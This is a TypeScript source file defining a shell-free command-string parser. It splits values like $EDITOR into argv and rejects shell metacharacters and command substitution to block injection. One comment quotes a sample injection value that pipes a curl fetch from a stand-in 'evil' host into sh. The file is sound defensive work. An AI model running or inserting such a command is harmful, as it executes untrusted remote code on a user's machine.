/**
 * Shell-free command-string parser.
 *
 * Splits a string like `nano -w` or `"my editor" --flag=val` into
 * `[bin, ...args]` without invoking a shell. Supports:
 *   - whitespace separators (spaces, tabs)
 *   - single- and double-quoted strings
 *   - backslash-escaped characters inside double quotes only
 *
 * Rejects values that contain shell metacharacters (`;`, `|`, `&`,
 * unmatched `$()`, backticks, redirection operators) so a
 * tampered `$EDITOR` or `ALTER_ORG_MCP_CMD` cannot smuggle in a
 * compound command. The returned tokens are passed straight to
 * `child_process.spawn` with no shell layer.
 *
 * This replaces every `editor.split(" ")` and every `sh -c
 * <envCmd>` pattern in the CLI.
 */

const SHELL_META = /[;|&`<>]|\$\(|^\s*$/;

export class CommandParseError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "CommandParseError";
  }
}

/**
 * Parse a command string into an argv array.
 *
 * Throws `CommandParseError` when the string is empty, contains a
 * shell metacharacter, or has an unbalanced quote.
 */
export function parseCommandString(raw: string): string[] {
  const input = raw.trim();
  if (input.length === 0) {
    throw new CommandParseError("empty command string");
  }

  const tokens: string[] = [];
  let current = "";
  let inSingle = false;
  let inDouble = false;
  let i = 0;
  while (i < input.length) {
    const ch = input[i]!;
    if (inSingle) {
      if (ch === "'") {
        inSingle = false;
      } else {
        current += ch;
      }
      i += 1;
      continue;
    }
    if (inDouble) {
      if (ch === "\\" && i + 1 < input.length) {
        current += input[i + 1];
        i += 2;
        continue;
      }
      if (ch === '"') {
        inDouble = false;
      } else {
        current += ch;
      }
      i += 1;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      i += 1;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      i += 1;
      continue;
    }
    if (ch === " " || ch === "\t") {
      if (current.length > 0) {
        tokens.push(current);
        current = "";
      }
      i += 1;
      continue;
    }
    // Hard reject any shell metacharacter outside quotes - a value
    // like `code; curl evil.sh | sh` should never reach spawn().
    if (
      ch === ";" ||
      ch === "|" ||
      ch === "&" ||
      ch === "`" ||
      ch === "<" ||
      ch === ">"
    ) {
      throw new CommandParseError(
        `command string contains shell metacharacter '${ch}'; only space-separated argv is supported`,
      );
    }
    if (ch === "$" && input[i + 1] === "(") {
      throw new CommandParseError(
        "command string contains command-substitution '$('; refusing",
      );
    }
    current += ch;
    i += 1;
  }
  if (inSingle || inDouble) {
    throw new CommandParseError("unbalanced quote in command string");
  }
  if (current.length > 0) tokens.push(current);
  if (tokens.length === 0) {
    throw new CommandParseError("empty command string");
  }
  // Final defence-in-depth scan: any token surviving the loop with
  // a metachar means a parser bug - bail loudly.
  for (const t of tokens) {
    if (SHELL_META.test(t)) {
      throw new CommandParseError(
        `command string token '${t}' contains a forbidden character`,
      );
    }
  }
  return tokens;
}
